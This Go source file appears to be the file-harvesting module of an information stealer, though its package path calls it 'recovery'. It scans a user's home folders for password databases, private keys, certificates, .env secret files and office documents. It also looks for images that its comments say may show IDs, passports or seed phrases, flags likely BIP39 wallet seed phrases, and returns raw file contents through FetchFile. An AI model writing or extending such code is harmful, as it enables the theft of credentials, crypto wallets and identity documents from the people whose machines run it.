package scanner

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"recovery/recovery/types"
)

const (
	maxFiles        = 500
	maxScanDepth    = 3
	maxFileSizeList = 100 * 1024 * 1024 // 100 MB — skip larger files from listing
	MaxFetchSize    = 10 * 1024 * 1024  // 10 MB — max content returned per fetch
)

var targetExtensions = map[string]bool{
	// Office documents
	".docx": true, ".doc": true, ".docm": true,
	".xlsx": true, ".xls": true, ".xlsm": true,
	".pptx": true, ".ppt": true, ".pptm": true,
	".odt": true, ".ods": true, ".odp": true,
	// Plain text / markup
	".txt": true, ".rtf": true, ".md": true,
	".csv": true, ".tsv": true,
	// PDFs
	".pdf": true,
	// Archives (metadata only — content not fetched automatically)
	".zip": true, ".7z": true, ".rar": true, ".tar": true, ".gz": true,
	// Credential / key files
	".kdbx": true, ".key": true, ".pem": true,
	".p12": true, ".pfx": true, ".ppk": true, ".jks": true,
	// Dotenv — commonly stores API keys and secrets
	".env": true,
	// Images — IDs, passports, screenshots of credentials, seed phrases
	".jpg": true, ".jpeg": true, ".png": true, ".gif": true,
	".bmp": true, ".webp": true, ".tiff": true, ".tif": true,
	".heic": true, ".heif": true,
}

// seedPhraseLengths are the BIP39 word counts we consider suspicious.
var seedPhraseLengths = map[int]bool{12: true, 20: true, 24: true}

type scanLocation struct {
	subPath string
	label   string
}

// ScanFiles walks common user locations and returns matching file metadata.
// At most maxFiles results are returned. Files larger than maxFileSizeList are skipped.
func ScanFiles() []types.FileResult {
	home, _ := os.UserHomeDir()
	if home == "" {
		return nil
	}

	var results []types.FileResult
	seen := make(map[string]bool)

	for _, loc := range getScanLocations() {
		dir := filepath.Join(home, loc.subPath)
		scanDir(dir, loc.label, 0, &results, seen)
		if len(results) >= maxFiles {
			break
		}
	}

	return results
}

func scanDir(dir, label string, depth int, results *[]types.FileResult, seen map[string]bool) {
	if depth > maxScanDepth || len(*results) >= maxFiles {
		return
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}

	for _, e := range entries {
		if len(*results) >= maxFiles {
			return
		}

		name := e.Name()
		// skip hidden / system files
		if strings.HasPrefix(name, ".") || strings.HasPrefix(name, "$") {
			continue
		}

		fullPath := filepath.Join(dir, name)

		if e.IsDir() {
			scanDir(fullPath, label, depth+1, results, seen)
			continue
		}

		ext := strings.ToLower(filepath.Ext(name))
		if !targetExtensions[ext] {
			continue
		}

		if seen[fullPath] {
			continue
		}
		seen[fullPath] = true

		info, err := e.Info()
		if err != nil {
			continue
		}

		if info.Size() > maxFileSizeList {
			continue
		}

		var tags []string
		if contentTags := contentFileTags(fullPath, ext, info.Size()); len(contentTags) > 0 {
			tags = contentTags
		}

		*results = append(*results, types.FileResult{
			Path:     fullPath,
			Name:     name,
			Ext:      ext,
			Size:     info.Size(),
			Modified: info.ModTime().Unix(),
			Dir:      label,
			Tags:     tags,
		})
	}
}

// looksLikeSeedLine returns true if every word is 3–8 lowercase letters.
// BIP39 words are exclusively lowercase a–z with lengths in that range.
func looksLikeSeedLine(words []string) bool {
	if !seedPhraseLengths[len(words)] {
		return false
	}
	for _, w := range words {
		if len(w) < 3 || len(w) > 8 {
			return false
		}
		for _, c := range w {
			if c < 'a' || c > 'z' {
				return false
			}
		}
	}
	return true
}

// FetchFile reads a file and returns its raw bytes.
// Returns an error if the file exceeds MaxFetchSize or does not exist.
func FetchFile(path string) ([]byte, error) {
	info, err := os.Stat(path)
	if err != nil {
		return nil, fmt.Errorf("file not found")
	}
	if info.IsDir() {
		return nil, fmt.Errorf("path is a directory")
	}
	if info.Size() > MaxFetchSize {
		return nil, fmt.Errorf("file too large (%d bytes, max %d)", info.Size(), MaxFetchSize)
	}
	return os.ReadFile(path)
}
